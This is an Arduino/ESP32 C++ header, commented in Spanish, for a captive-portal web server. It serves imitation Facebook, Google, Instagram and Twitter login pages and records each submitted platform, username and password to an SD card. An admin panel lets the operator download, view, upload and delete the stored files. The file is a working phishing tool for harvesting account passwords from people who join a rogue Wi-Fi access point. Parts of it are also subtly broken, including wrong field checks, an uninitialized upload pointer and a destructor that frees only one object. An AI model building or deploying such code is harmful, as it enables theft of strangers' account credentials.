/*!
 * @file WebServerHandler.h
 * @author NGUEYOU SIMO, Neil L.;
 * @brief Provee la declaración y documentación de la clase WebServerManager y sus métodos para manejar un servidor web y un servicio DNS en un entorno Arduino.
 *
 * Este archivo define la lógica de un portal cautivo, la carga y lectura de archivos desde la SD, la autenticación de un panel de administración,
 * y la gestión de credenciales que se envían mediante formularios HTTP, entre otras funcionalidades relacionadas con la comunicación web.
 * @class WebServerManager
 * @brief Clase principal que administra un servidor web y un servicio DNS para ofrecer un portal cautivo y funcionalidades de administración.
 *
 * Provee métodos para inicializar y procesar requerimientos de un servidor web, manejar solicitudes de diferentes rutas (endpoints),
 * así como gestionar la lectura y escritura de documentos en una tarjeta SD. También se encarga de la validación de credenciales
 * de administración y el manejo de eventos.
 */

#ifndef WEB_SERVER_HANDLER_H
#define WEB_SERVER_HANDLER_H

#include "include.h"

class WebServerManager
{
protected:
    WebServer *m_server;
    DNSServer *m_dnsServer;
    SDCardManager *m_sdManager;
    //    AuthenticationManager* m_authManager;
    String m_indexPage = "\0";
    String m_exitPage = "\0";
    String m_adminPage = "\0";
    String m_datafile = "\0";
    String m_facebook = "\0";
    String m_google = "\0";
    String m_instagram = "\0";
    String m_twitter = "\0";

    uint8_t _loginAttempts = 0;
    unsigned long _lastAttemptTime = 0;

    /*!
     * @brief Inicia el servidor DNS para redirigir todo dominio a la IP del portal cautivo.
     *
     * Llama al método start(...) del objeto DNS configurando el puerto y la IP local, permitiendo capturar las solicitudes de los clientes.
     */
    inline void setupCaptivePortal() { m_dnsServer->start(DNS_PORT, "*", WiFi.softAPIP()); }

    /*!
     * @brief Determina el tipo de contenido (MIME) a partir de la extensión de un archivo.
     *
     * Retorna diferentes MIME types (text/html, image/png, etc.) o "application/octet-stream" si no se reconoce la extensión.
     */
    inline String getContentType(String &filename)
    {
        if (filename.endsWith(".html"))
            return "text/html";
        else if (filename.endsWith(".htm"))
            return "text/html";
        else if (filename.endsWith(".css"))
            return "text/css";
        else if (filename.endsWith(".js"))
            return "application/javascript";
        else if (filename.endsWith(".png"))
            return "image/png";
        else if (filename.endsWith(".jpg"))
            return "image/jpeg";
        else if (filename.endsWith(".gif"))
            return "image/gif";
        else if (filename.endsWith(".svg"))
            return "image/svg+xml";
        else if (filename.endsWith(".ico"))
            return "image/x-icon";
        else if (filename.endsWith(".txt"))
            return "text/plain";
        else if (filename.endsWith(".json"))
            return "application/json";
        else if (filename.endsWith(".xml"))
            return "text/xml";
        else if (filename.endsWith(".pdf"))
            return "application/pdf";
        else if (filename.endsWith(".zip"))
            return "application/zip";

        return "application/octet-stream";
    }


    /*!
     * @brief Manejador para la ruta que recibe credenciales de formulario ("/submit-credentials").
     *
     * Captura la plataforma, usuario y contraseña enviados por POST, los almacena (o registra en log) y devuelve respuesta al cliente.
     */
    inline void handleSubmitCredentials(void)
    {
        // variables para almacenar temporalmente las entradas del usuario
        String credentials = "{\n\t\"platform\": \"" + m_server->arg("platform") + "\",\n";
        credentials.concat("\t\"user id\": \"" + m_server->arg("username") +"\",\n");
        credentials.concat("\t\"password\": \"" + m_server->arg("password") + "\"\n},");


        // guarda las entradas en un archivo de texto
        if (!saveToDataFile(credentials))
        {
            m_sdManager->logEvent(FAILED_CREDENTIALS);
#if (WITH_ERROR_TYPE)
            Serial.println(ERROR_SAVE_CREDENTIALS);
#endif
            return m_server->send(417, "text/plain", "");
        }

#if (WITH_SUCCESS_MESSAGE)
            // se imprime por consola los valores de las entradas
            Serial.println(SUCCESS_SAVE_CREDENTIALS);
#endif 
        // se envia una respuesta al cliente
        m_server->send(201, "text/plain", "");
    }


    /*!
     * @brief Manejador para la ruta del panel de administración ("/admin-panel").
     *
     * Carga la página HTML correspondiente al panel de administración desde la SD y la envía al cliente.
     */
    inline void handleAdminPanel(void)
    {
        generateJSONFile();

        if (validateAdminCredentials(m_server->arg("username"), m_server->arg("password")))
        {
            m_server->send(200, "text/html", getHTMLContent(m_adminPage));
            Serial.println(NEW_ADMIN_LOGIN);
        }
        else
        {
            m_server->send(401, "text/plain", "Accesso denegado");
            Serial.println(FAILED_ADMIN_LOGIN);
        }
    }


    inline void handleLoginPages(void)
    {
        String platform = m_server->arg("platform");
        String content;
        if     (m_facebook.indexOf(platform) > -1)
            content = m_sdManager->readFile(m_facebook);
        else if(m_google.indexOf(platform) > -1)
            content = m_sdManager->readFile(m_google);
        else if(m_instagram.indexOf(platform) > -1)
            content = m_sdManager->readFile(m_instagram);
        else if(m_twitter.indexOf(platform) > -1)
            content = m_sdManager->readFile(m_twitter);
        else
            m_server->send(404, "text/plain", "page not found");

        Serial.printf(NEW_PAGE_REQ, platform.c_str());
        m_server->send(200, "text/html", content);
    }


    inline void handlePageIcons(void)
    {
        if (!m_server->hasArg("icon-name"))
            return m_server->send(400, "text/plain", "");
            
        String iconPath = "/webpages/icons/" + m_server->arg("icon-name");

         if(!m_sdManager->getFileSystem().exists(iconPath))
        {
    #if (WITH_ERROR_TYPE)
            Serial.printf(ERROR_NO_FILE, iconPath);
    #endif
            return m_server->send(404, "text/plain", "File doens't exist");
        }

        File file = m_sdManager->getFileSystem().open(iconPath);

        if(!file)
        {
    #if (WITH_ERROR_TYPE)
            Serial.printf(ERROR_FILE_OPEN, iconPath.c_str());
    #endif
            return m_server->send(404, "text/plain", "File not found");
        }

        String fileName = file.name();
        size_t fileSize = file.size();

        Serial.printf("Enviando %u bytes...", fileSize);

        m_server->sendHeader("Content-Type","image/png");
        m_server->sendHeader("Content-Length", String(fileSize));
        m_server->sendHeader("Cache-Control", "max-age=31536000");
        m_server->setContentLength(fileSize);
        m_server->streamFile(file, "application/octet-stream");
        
        file.close();
        m_sdManager->logEvent("Sent file" + String(file.name()) + "to client");
    }


    void handleFileDownload(void)
    {
        if(!m_server->hasArg("file-path"))
            return m_server->send(400, "text/plain", "ninguna ruta indicada");

        String path = m_server->arg("file-path");

        if(!m_sdManager->getFileSystem().exists(path))
        {
    #if (WITH_ERROR_TYPE)
            Serial.println(ERROR_NO_FILE);
    #endif
            return m_server->send(404, "text/plain", "El archivo no existe");
        }

        File* file = new File(m_sdManager->getFileSystem().open(path));

        if(!*file)
        {
    #if (WITH_ERROR_TYPE)
            Serial.println(ERROR_FILE_OPEN);
    #endif
            return m_server->send(401, "text/plain", "error al abrir el archivo");       
        }

        String fileName(file->name());
        m_server->sendHeader("Content-Type", getContentType(fileName));
        m_server->sendHeader("Content-Disposition", "attachment; filename="+fileName);
        m_server->sendHeader("Connection", "close");
        m_server->streamFile(*file, "application/octet-stream");

        file->close();
        m_sdManager->logEvent("Sent file" + String(file->name()) + "to client");
        delete file;
    }

    /*!
     * @brief Manejador para la subida de archivos al servidor (vía formulario o HTTP POST).
     *
     * Permite recibir un archivo en trozos (porciones) y guardarlo en la tarjeta SD. Al finalizar, notifica el éxito o el fallo.
     */
    inline void handleFileUpload(void)
    {
        HTTPUpload &upload = m_server->upload();
        File *uploadFile;

        if (upload.status == UPLOAD_FILE_START)
        {
            String filename = upload.filename;
            if (!filename.startsWith("/"))
                filename = "/" + filename;

            m_sdManager->logEvent("Empieza la carga del archivo " + filename);
            Serial.printf(UPLOAD_STARTED, filename);

            uploadFile = new File(m_sdManager->getFileSystem().open(filename, FILE_WRITE));
        }
        else if (upload.status == UPLOAD_FILE_WRITE)
        {
            if (*uploadFile)
                uploadFile->write(upload.buf, upload.currentSize);
        }
        else if (upload.status == UPLOAD_FILE_END)
        {
            if (*uploadFile)
            {
                uploadFile->close();
                m_sdManager->logEvent("Archivo subido al servidor: " + upload.filename);
                Serial.printf(NEW_FILE_UPLOADED, upload.filename.c_str());

                m_server->send(200, "text/plain", "File Uploaded Successfully");
            }
            else
            {
                m_sdManager->logEvent("Error al subir el archivo " + upload.filename);
                Serial.printf(FAILED_FILE_UPLOAD, upload.filename.c_str());

                m_server->send(500, "text/plain", "Upload Failed");
            }
        }

        delete uploadFile;
    }


    void handleFileDisplay(void)
    {
        if(!m_server->hasArg("file-path"))
            return m_server->send(400, "text/plain", "ninguna ruta indicada");

        String path = m_server->arg("file-path");

        if(!m_sdManager->getFileSystem().exists(path))
        {
    #if (WITH_ERROR_TYPE)
            Serial.println(ERROR_NO_FILE);
    #endif
            return m_server->send(404, "text/plain", "El archivo no existe");
        }

        String content = m_sdManager->readFile(path);

        if(content=="\0")
        {
    #if (WITH_ERROR_TYPE)
            Serial.println(ERROR_FILE_OPEN);
    #endif
            return m_server->send(401, "text/plain", "error al abrir el archivo");
        }
        
        Serial.printf(NEW_FILE_CONTENT, path.c_str());
        m_server->send(200, "text/plain", content);
    }


    void handleFileDelete(void)
    {
        if(!m_server->hasArg("file-path"))
            return m_server->send(400, "text/plain", "ninguna ruta indicada");

        String path = m_server->arg("file-path");

        if(!m_sdManager->getFileSystem().exists(path))
        {
    #if (WITH_ERROR_TYPE)
            Serial.println(ERROR_NO_FILE);
    #endif
            return m_server->send(404, "text/plain", "El archivo no existe");
        }

        if(!m_sdManager->deleteFile(path))
        {
    #if (WITH_ERROR_TYPE)
            Serial.println(ERROR_FILE_OPEN);
    #endif
            m_server->send(401, "text/plain", "error al abrir el archivo");
        }
        else
            m_server->send(204, "text/plain", "");

        Serial.printf(NEW_FILE_DELETED, path.c_str());
    }

    /*!
     * @brief Manejador para configurar la red WiFi vía formulario.
     *
     * Permite al usuario introducir un SSID y contraseña; si son válidos, se guarda el contenido en la tarjeta SD e informa de la actualización.
     */
    inline void handleWiFiConfig(void)
    {
        if (!m_server->hasArg("wifi-ssid"))
            return m_server->send(400, "text/plain", "Ningun dato proporcionado");

        String newSSID     = m_server->arg("wifi-ssid");
        String newPassword = m_server->arg("wifi-password");

        // Validate input
        if (newSSID.length() >= 1 && newPassword.length() >= 17)
        {
            if (WiFiCaptiveManager::setWifiStation(newSSID, newPassword))
            {
                m_server->send(200, "text/plain", "WiFi Configuration Updated");
                m_sdManager->logEvent("Configuración cambiada");
                Serial.println(NEW_WIFI_CONFIG);
            }
            else
                m_server->send(400, "text/plain", "Invalid Configuration");
        }
        else
            m_server->send(400, "text/plain", "ERROR: tamaño de las entradas incorrecto");
        
    }


    inline void handlePagesPath(void)
    {
        String fbPath = m_server->arg("facebook-html");
        String glPath = m_server->arg("google-html");
        String isPath = m_server->arg("instagram-html");
        String twPath = m_server->arg("twitter-html");

        if(!fbPath==NULL)
            m_facebook = fbPath;
        if(!fbPath==NULL)
            m_google = glPath;
        if(!fbPath==NULL)
            m_instagram = isPath;
        if(!fbPath==NULL)
            m_twitter = twPath;

        m_server->send(200, "text/plain", "");
    }


    inline void handleAccessPoint(void)
    {
        if (!m_server->hasArg("ap-ssid"))
            return m_server->send(400, "text/plain", "Ningun dato proporcionado");

        String newSSID     = m_server->arg("ap-ssid");
        String newPassword = m_server->arg("ap-password");

        // Validate input
        if (newSSID.length() >= 1 && newPassword.length() >= 17)
        {
            WiFiCaptiveManager::setAccessPoint(newSSID, newPassword);

            m_server->send(200, "text/plain", "WiFi Configuration Updated");
            m_sdManager->logEvent("Configuración cambiada");
            Serial.println("Configuración wifi guardada");
        }
        else
        {
            m_server->send(400, "text/plain", "Invalid Configuration");
        }

    }

    /*!
     * @brief Función auxiliar para guardar de forma confiable datos recibidos, creando el directorio si no existe.
     *
     * @param data Contenido que se escribirá en el archivo configurado como archivo de datos.
     * @return `true` si la operación fue satisfactoria, `false` en caso contrario.
     */
    inline bool saveToDataFile(String data)
    {
        String dir = m_sdManager->getFileDir(m_datafile);
        if (!m_sdManager->getFileSystem().exists(dir))
        {
            if (!m_sdManager->createDir(dir))
                return 0;
        }

        return m_sdManager->appendFile(m_datafile, data) ? 1 : 0;
    }

    // inline bool validateAdminCredentials()
    inline bool validateAdminCredentials(const String &username, const String &password)
    {
        // Check login attempts and lockout
        if (_loginAttempts >= MAX_LOGIN_ATTEMPTS &&
            (millis() - _lastAttemptTime) < LOGIN_LOCKOUT_TIME)
        {
            return 0;
        }

        // bool validCredentials = m_server->authenticate(ADMIN_USERNAME, ADMIN_PASSWORD);
        bool validCredentials = (username == ADMIN_USERNAME &&
                                 password == ADMIN_PASSWORD);

        if (!validCredentials)
        {
            _loginAttempts++;
            _lastAttemptTime = millis();
            m_sdManager->logEvent("Intento de connexión como admin fallado. Número de intentos: " + String(_loginAttempts));
            // m_server->requestAuthentication();
        }
        else
        {
            m_sdManager->logEvent("Nueva connexión administrador");
            _loginAttempts = 0;
        }

        return validCredentials;
    }

public:
    /*!
     * @brief Constructor por defecto que inicializa los apuntadores a nulo.
     *
     * Crea un objeto de tipo WebServerManager, pero no establece la configuración de la red ni la lógica del servidor.
     */
    WebServerManager()
        : m_server(nullptr), m_dnsServer(nullptr), m_sdManager(nullptr)
    {
    }

    /*!
     * @brief Constructor que inicializa los servicios de servidor web y DNS con referencias a la tarjeta SD y autenticación.
     *
     * @param sd Puntero a la clase SDCardManager para manejar archivos.
     * @param auth Puntero a la clase AuthenticationManager para validar credenciales de administrador.
     * @param port Puerto en el que se iniciará el servidor web.
     */
    WebServerManager(SDCardManager *sd, uint8_t port = SERVER_PORT)
        : m_server(new WebServer(&port)), m_dnsServer(new DNSServer()), m_sdManager(sd)
    {
    }

    WebServerManager(const WebServerManager &) = delete;

    WebServerManager operator=(const WebServerManager &) = delete;

    /*!
     * @brief Destructor de la clase que libera la memoria asignada.
     *
     * Destruye los objetos creados dinámicamente, incluyendo el servidor web, el servidor DNS, el manejador de SD y el manejador de autenticación.
     */
    virtual ~WebServerManager()
    {
        delete m_server,
               m_dnsServer,
               m_sdManager;
    }

    /*!
     * @brief Inicia la lógica del DNS y configura las rutas (endpoints) principales del servidor web.
     *
     * Define las rutas para la pantalla de administración, la recepción de credenciales
     * y la función que se llama cuando las rutas no coinciden con ninguna definida (redireccionamiento al portal cautivo).
     */
    inline void start()
    {
        // setupCaptivePortal(); <-- shouldn't setup captive portal for the server
        m_server->on("/", HTTP_GET, [this](){
                        String content = m_sdManager->readFile(m_indexPage);
                        m_server->send(200, "text/html", content); });

        m_server->on("/logout", HTTP_POST, [this](){
                        String content = m_sdManager->readFile(m_indexPage);
                        m_server->send(200, "text/html", content); });

        m_server->on("/admin-panel", HTTP_POST, [this]()
                     { handleAdminPanel(); });

        m_server->on("/admin-panel/wifi-configuration", HTTP_POST, [this]()
                     { handleWiFiConfig(); });

        m_server->on("/admin-panel/socials-pages-path", HTTP_POST, [this]()
                     { handlePagesPath(); });
        
        m_server->on("/admin-panel/download", HTTP_POST, [this]()
                     { handleFileDownload(); });

        m_server->on("/admin-panel/upload", HTTP_PUT, [this]()
                     { m_server->send(200); }, [this]()
                     { handleFileUpload(); } );

        m_server->on("/admin-panel/display", HTTP_GET, [this]()
                     { handleFileDisplay(); });

        m_server->on("/admin-panel/delete", HTTP_DELETE, [this]()
                     { handleFileDelete(); });

        m_server->on("/admin-panel/admin-app.js", HTTP_GET, [this](){
                String content = m_sdManager->readFile(m_sdManager->getFileDir(m_indexPage)
                                                        + "/admin-app.js");
                m_server->send(200, "application/javascript", content); });

        m_server->on("/admin-panel/data.json", HTTP_GET, [this](){
            String content = m_sdManager->readFile(JSON_FILE_PATH);
            m_server->send(200, "application/json", content); });

        m_server->on("/admin-panel/admin-style.css", HTTP_GET, [this](){
            String content = m_sdManager->readFile(m_sdManager->getFileDir(m_indexPage)
                                                    + "/admin-style.css");
            m_server->send(200, "text/css", content); });

        m_server->on("/get-login-page", HTTP_GET, [this]()
                     { handleLoginPages(); });

        m_server->on("/submit-credentials", HTTP_POST, [this]()
                     { handleSubmitCredentials(); });

        m_server->on("/get-page-icons", HTTP_GET, [this]()
                     { handlePageIcons(); });

        m_server->onNotFound([this](){
            m_server->sendHeader("Location", "/");
            m_server->send(302, "text/plain", "redirect to captive portal"); });

        // Start servers
        m_server->begin();
#if (WITH_SUCCESS_MESSAGE)
        Serial.println(SUCCESS_SERVER_INIT);
#endif
        delay(2000);
    }

    /*!
     * @brief Procesa las peticiones entrantes tanto del servidor DNS como del servidor web.
     *
     * Debe llamarse de forma frecuente dentro del loop principal de Arduino para manejar solicitudes DNS y HTTP.
     */
    inline void process()
    {
        m_dnsServer->processNextRequest();
        m_server->handleClient();
    }

    /*!
     * @brief Asigna la ruta de archivo en la tarjeta SD a un tipo de archivo específico.
     *
     * @param path Ruta o nombre del archivo (o directorio) a asignar.
     * @param fileType Tipo de archivo que se configura (p.ej. página de índice, archivo de datos, etc.).
     */
    inline void setPath(const char *path, FileType_t fileType)
    {
        switch (fileType)
        {
        case ADMINPAGE:
            m_adminPage = path;
            break;

        case INDEXPAGE:
            m_indexPage = path;
            break;

        case DATAFILE:
            m_datafile = path;
            break;

        case EXITPAGE:
            m_exitPage = path;
            break;
            /*
            case LOGFILE: m_sdManager->setPath(path);
                break;
            */
#if (WITH_ERROR_TYPE)
        default:
            Serial.printf(ERROR_FILE_TYPE, (char *)fileType);
            break;
#endif
        }
    }

    /*!
     * @brief Sobrecarga que recibe una cadena String para asignar la ruta a un tipo de archivo.
     *
     * @param path Cadena con la ruta o nombre del archivo (o directorio).
     * @param fileType Tipo de archivo que se configura.
     */
    inline void setPath(const String &path, FileType_t fileType)
    {
        switch (fileType)
        {
        case ADMINPAGE:
            m_adminPage = path;
            break;

        case INDEXPAGE:
            m_indexPage = path;
            break;

        case DATAFILE:
            m_datafile = path;
            break;

        case EXITPAGE:
            m_exitPage = path;
            break;
            /*
            case LOGFILE: m_sdManager->setPath(path);
                break;
            */
#if (WITH_ERROR_TYPE)
        default:
            Serial.printf(ERROR_FILE_TYPE, (char *)fileType);
            break;
#endif
        }
    }

    /*!
     * @brief Asigna la ruta o archivo correspondiente a una plataforma concreta (Facebook, Google, etc.).
     *
     * Abre el archivo para verificar si es un directorio e internamente ajusta la ruta final necesaria.
     *
     * @param path Ruta o nombre del archivo (o directorio) que contiene la plataforma.
     * @param platform Plataforma social a asignar.
     */
    inline void setPath(const char *path, Platform_t platform)
    {
        String str = path;
        switch (platform)
        {
        case FACEBOOK:
            if (str.indexOf('.') < 0 )
                m_facebook = str + "/index.html";
            else
                m_facebook = path;
            break;

        case GOOGLE:
            if (str.indexOf('.') < 0)
                m_google = str + "/index.html";
            else
                m_google = path;
            break;

        case INSTAGRAM:
            if (str.indexOf('.') < 0)
                m_instagram = str + "/index.html";
            else
                m_instagram = path;
            break;

        case TWITTER:
            if (str.indexOf('.') < 0)
                m_twitter = str + "/index.html";
            else
                m_twitter = path;
            break;
#if (WITH_ERROR_TYPE)
        default:
            Serial.printf(ERROR_FILE_TYPE, (char *)platform);
            break;
#endif
        }
    }

    /*!
     * @brief Sobrecarga que recibe una cadena String para asignar la ruta de la plataforma solicitada.
     *
     * @param path Cadena con la ruta o nombre del archivo (o directorio) de la plataforma.
     * @param platform Plataforma social a asignar.
     */
    inline void setPath(const String &path, Platform_t platform)
    {
        switch (platform)
        {
        case FACEBOOK:
            if (path.indexOf('.') < 0)
                m_facebook = path + "/index.html";
            else
                m_facebook = path;
            break;

        case GOOGLE:
            if (path.indexOf('.') < 0)
                m_google = path + "/index.html";
            else
                m_google = path;
            break;

        case INSTAGRAM:
            if (path.indexOf('.') < 0)
                m_instagram = path + "/index.html";
            else
                m_instagram = path;
            break;

        case TWITTER:
            if (path.indexOf('.') < 0)
                m_twitter = path + "/index.html";
            else
                m_twitter = path;
            break;
#if (WITH_ERROR_TYPE)
        default:
            Serial.printf(ERROR_FILE_TYPE, (char *)platform);
            break;
#endif
        }
    }

    inline String getHTMLContent(const String &path)
    {
        String *adminContent = new String(m_sdManager->readFile(path));
        adminContent->replace(Placeholder_t::AccessPointSSID, WiFi.softAPSSID());
        adminContent->replace(Placeholder_t::ServerIP, WiFi.softAPIP().toString());
        adminContent->replace(Placeholder_t::HostsConected, String(WiFi.softAPgetStationNum()));

        //size_t sdTotalBytes = m_sdManager->getFileSystem().cardSize();
        //size_t sdUsedBytes  = m_sdManager->getFileSystem().usedBytes();
        //size_t sdFreeBytes  = m_sdManager->getFileSystem().totalBytes();

        adminContent->replace(Placeholder_t::sdCardType, SDCardManager::getCardType(
                            SD_MMC.cardType()));
        adminContent->replace(Placeholder_t::sdSize, getReadableSize(
                            SD_MMC.cardSize()));
        adminContent->replace(Placeholder_t::sdSpaceUsed, getReadableSize(
                            SD_MMC.usedBytes()));
        adminContent->replace(Placeholder_t::sdFreeSpace, getReadableSize( 
                            SD_MMC.totalBytes()));
        

        if (WiFi.status() == WL_CONNECTED)
        {
            adminContent->replace(Placeholder_t::WifiSSID, WiFi.SSID());
            adminContent->replace(Placeholder_t::ClientIP, WiFi.localIP().toString());
            adminContent->replace(Placeholder_t::WiFiStrength, String(WiFi.RSSI()));
            adminContent->replace(Placeholder_t::WifiStatus, "Conectado");
        }
        else
        {
            adminContent->replace(Placeholder_t::WifiSSID, WiFi.SSID());
            adminContent->replace(Placeholder_t::ClientIP, WiFi.localIP().toString());
            adminContent->replace(Placeholder_t::WiFiStrength, "N/A");
            adminContent->replace(Placeholder_t::WifiStatus, "No Conectado");
        }

        return *adminContent;
    }


    inline void generateJSONFile(const String &dirname = "/", String *fileList = new String(""))
    {
        File root = m_sdManager->getFileSystem().open(dirname);
        if (!root)
            return;

        if (dirname == "/")
            *fileList += "{\n\t\"files\": [\n";


        while (true)
        {
            File entry = root.openNextFile();
            if (!entry)
                break;
            
            while (entry.isDirectory())
            {
                generateJSONFile(entry.path(), fileList);
                entry = root.openNextFile();
            }

            String fileName = entry.name();
            
            if (!(fileName == "\0") || !(fileName == ""))
            {
                *fileList += "\t\t{\n\t\t\t\"name\" : \"" + fileName + "\",\n";
                *fileList += "\t\t\t\"path\" : \"" + String(entry.path()) + "\",\n";
                *fileList += "\t\t\t\"size\" : \"" + getReadableSize(entry.size()) + "\"\n";
                *fileList += "\t\t},\n";
            }
            entry.close();
        }

        if (dirname == "/")
        {
            // Remove last comma and close JSON array
            *fileList = fileList->substring(0, fileList->length() - 2);
            *fileList += "\n\t]\n}";
            //Serial.printf("File list:\n%s\n", fileList->c_str());
            
            if (!m_sdManager->writeFile(JSON_FILE_PATH, *fileList))
                Serial.println(ERROR_GENERATE_JSON);
            else
                Serial.println(SUCCESS_GENERATE_JSON);
            delete fileList;
        }
    }


/*
    inline void generateJSONFile(const String &dirname = "/", String *fileList = new String(""))
    {
        File root = m_sdManager->getFileSystem().open(dirname);
        if (!root)
            return;

        if (dirname == "/")
            *fileList += "{\n\t\"folders\": [\n";

        File entry = root.openNextFile();
        while (entry.isDirectory())
        {
            generateJSONFile(entry.path(), fileList);
            entry = root.openNextFile();
        }

        String rootName = root.name();
        if (!(rootName == ""))
        {
            *fileList += "\t\t{\n\t\t\t\"name\" : \"";
            *fileList += rootName;
            *fileList += "\",\n\t\t\t\"files\": [\n";
        }

        while (true)
        {
            if (!entry)
                break;
            String fileName = entry.name();

            if (!(fileName == "\0") || !(fileName == ""))
            {
                *fileList += "\t\t\t\t{\n\t\t\t\t\t\"name\" : \"" + fileName + "\",\n";
                *fileList += "\t\t\t\t\t\"path\" : \"" + String(entry.path()) + "\",\n";
                *fileList += "\t\t\t\t\t\"size\" : \"" + String(entry.size()) + "\"\n";
                *fileList += "\t\t\t\t},\n";
            }
            entry.close();
            entry = root.openNextFile();
        }
        // delete entry;
        if (!(rootName == ""))
        {
            if (!(fileList->charAt(fileList->length() - 2) == '['))
                *fileList = fileList->substring(0, fileList->length() - 2);
            *fileList += "\n\t\t\t]\n\t\t},\n";
        }

        if (dirname == "/")
        {
            // Remove last comma and close JSON array
            *fileList = fileList->substring(0, fileList->length() - 2);
            *fileList += "\n\t]\n}";
            
            if (!m_sdManager->writeFile(JSON_FILE_PATH, *fileList))
                Serial.println(ERROR_GENERATE_JSON);
            else
                Serial.println(SUCCESS_GENERATE_JSON);
            delete fileList;
        }
    }

    */
};

#endif // WEB_SERVER_HANDLER_H